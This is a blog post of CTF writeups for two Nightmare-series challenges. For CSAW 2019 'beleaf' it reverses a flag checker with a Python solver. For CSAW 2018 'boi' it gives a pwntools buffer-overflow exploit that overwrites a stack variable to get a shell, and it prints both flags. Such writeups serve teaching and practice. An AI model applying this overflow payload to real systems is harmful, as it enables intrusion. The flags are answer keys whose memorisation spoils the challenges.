---
title: 'Writeups: Nightmare Series'
date: '2024-07-24'
lastmod: '2024-07-25'
tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
draft: false
summary: 'Writeups for Nightmare Series'
authors: ['default']
---

<div className="border-solid border-2 border-surface0 dark:border-surface0-dark p-2 bg-base dark:bg-base-dark mt-5">
  <TOCInline toc={props.toc} asDisclosure />
</div>

## CSAW 2019 beleaf

### Information

 - Category: Reverse
 - Points: 50

### Description

> tree sounds are best listened to by https://binary.ninja/demo or ghidra

<Download name="beleaf" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/03-beginner_re/csaw19_beleaf/beleaf" type="Binary" />

### Writeup

简单运行一下程序：

```plain-text
λ ~/ ./beleaf
Enter the flag
>>> i dont have the fucking flag
Incorrect!
```

一些基本信息：

```plain-text
λ ~/ file beleaf
beleaf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6d305eed7c9bebbaa60b67403a6c6f2b36de3ca4, stripped
```

大概可以推测出我们的目标就是弄到一个正确的 `flag`。

丢到 IDA 里发现，输入长度小于等于 32 (0x20) 会输出 `Incorrect!`，所以 `flag` 长度起码 33 字节。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/24/pkb9i4O.png" width={1920} height={1080} />
</center>

接下来进入一个简单的 for 循环，将我们输入的每一个字符逐一放到 `calc_idx` 函数中，并将返回值与 `valid_arr[i]` 比较，如果不等于 `valid_arr[i]` 则输出 `Incorrect!`。如果所有字符都通过了验证，则输出 `Correct!`

再看看 `calc_idx` 函数，大致可以看出它的作用是根据传入的字符查找它在 `charset` 中对应的索引。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/24/pkb9kCD.png" width={1920} height={1080} />
</center>

`calc_idx` 的核心如下：

 - `character == charset[i]` 则返回索引 `i`
 - `character >= charset[i]` 则设置索引为 `i = 2 * (i + 1)`
 - 否则设置索引为 `i = 2 * i + 1`

因此我们构造 `flag` 的关键条件就是：

 - `flag` 长度 >= 33
 - `calc_idx(input[i]) == valid_arr[i]`

### Exploit

```python
#!/usr/bin/python3

import sys

valid_arr = [
    0x01, 0x09, 0x11, 0x27, 0x02,
    0x00, 0x12, 0x03, 0x08, 0x12,
    0x09, 0x12, 0x11, 0x01, 0x03,
    0x13, 0x04, 0x03, 0x05, 0x15,
    0x2E, 0x0A, 0x03, 0x0A, 0x12,
    0x03, 0x01, 0x2E, 0x16, 0x2E,
    0x0A, 0x12, 0x06
]

charset = [
    0x00000077, 0x00000066, 0x0000007B, 0x0000005F, 0x0000006E,
    0x00000079, 0x0000007D, 0xFFFFFFFF, 0x00000062, 0x0000006C,
    0x00000072, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0x00000061, 0x00000065, 0x00000069,
    0xFFFFFFFF, 0x0000006F, 0x00000074, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000067,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0x00000075
]

def create_charset():
    result = ''

    for c in charset:
        try:
            result += chr(c)
        except OverflowError:
            continue

    return result

def checker(char):
    i = 0
    while char != charset[i]:
        if char >= charset[i]:
            i = 2 * (i + 1)
        else:
            i = 2 * i + 1
    return i

def main():
    charset = create_charset()

    i = 0
    while (i < 33):
        for c in charset:
            if checker(ord(c)) == valid_arr[i]:
                sys.stdout.write(c)
        i += 1

if __name__ == '__main__':
    main()
```

### Flag

Flag: `flag{we_beleaf_in_your_re_future}`

## CSAW 2018 Quals Boi

### Information

 - Category: Pwn
 - Points: 25

### Description

> Only big boi pwners will get this one!

<Download name="boi" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/csaw18_boi/boi" type="Binary" />

### Writeup

```plain-text
λ ~/ file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
λ ~/ pwn checksec boi
[*] '/home/cub3y0nd/Projects/CTF/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

试运行一下，发现它只是输出系统时间：

```plain-text
λ ~/ ./boi
Are you a big boiiiii??
aaaa
Thu Jul 25 05:35:00 PM CST 2024
```

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbJ5H1.png" width={1920} height={1080} />
</center>

从 IDA 里面可以看出，程序可以将一个 24 (0x18) 字节 数据读入 `buf` 中。如果 `v5` 的 HIDWORD（高位四字节）等于 `0xCAF3BAEE` 则返回 shell，否则返回系统时间。

所以我们的思路就是溢出，然后覆盖原始数据。

下面是两种得到溢出点的方法：

1. 由于 `buf` 只有 16 字节大小（2 * __int64），而 `read` 却可以读取 24 字节数据，所以这里存在溢出问题，可以覆盖变量 `v5` 的内容。所以 payload 可以是 16（填满 buf） + 4（填满 4 字节低位使后面的数据可以直接覆盖高位数据，也就是做判断的部分） 字节垃圾数据 + `0xCAF3BAEE`。
2. 通过调试知道溢出点是 20 (0x14)：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbYnU0.png" width={1920} height={1080} />
</center>

### Exploit

```python
#!/usr/bin/python3

from pwn import *

target = process('./boi')

payload = b'A' * 0x14 + p32(0xcaf3baee)

target.send(payload)
target.interactive()
```

### Flag

Flag: `flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`

